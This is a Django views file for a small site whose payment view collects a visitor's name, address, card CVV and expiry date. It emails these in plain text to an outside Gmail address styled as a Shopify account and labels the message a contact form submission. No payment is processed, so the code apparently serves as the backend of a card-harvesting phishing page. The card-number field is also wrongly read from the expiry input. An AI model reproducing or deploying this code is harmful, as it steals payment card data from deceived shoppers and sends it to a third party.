from django.core.mail import send_mail
from django.shortcuts import render
from django.conf import settings

def home(request):
    return render(request, "homePage.html")

def middle(request):
    return render(request, "middlePage.html")

def payment(request):
    if request.method == 'POST':
        firstName = request.POST.get('firstName')
        lastName = request.POST.get('lastName')
        address = request.POST.get('address')
        country = request.POST.get('country')
        zip = request.POST.get('zip')
        cvv = request.POST.get('cvv')
        expires = request.POST.get('expires')
        cardNumber = request.POST.get('expires')
        
        
        details = {
            "firstName" : firstName,
            "lastName" : lastName,
            "address" : address,
            "country" : country,
            "zip" : zip,
            "cvv" : cvv,
            "expires" : expires,
            "cardNumber" : cardNumber
        }
        
        message = "\n".join([f"{key}: {value}" for key, value in details.items()])
        subject = f"New Contact Form Submission from {details['firstName']}"
        recipient = ['shopifyus3343@gmail.com']
        
        send_mail(subject, message, settings.EMAIL_HOST_USER, recipient, fail_silently=False)
        
        return render(request, 'endPage.html') 

    return render(request, 'endPage.html')
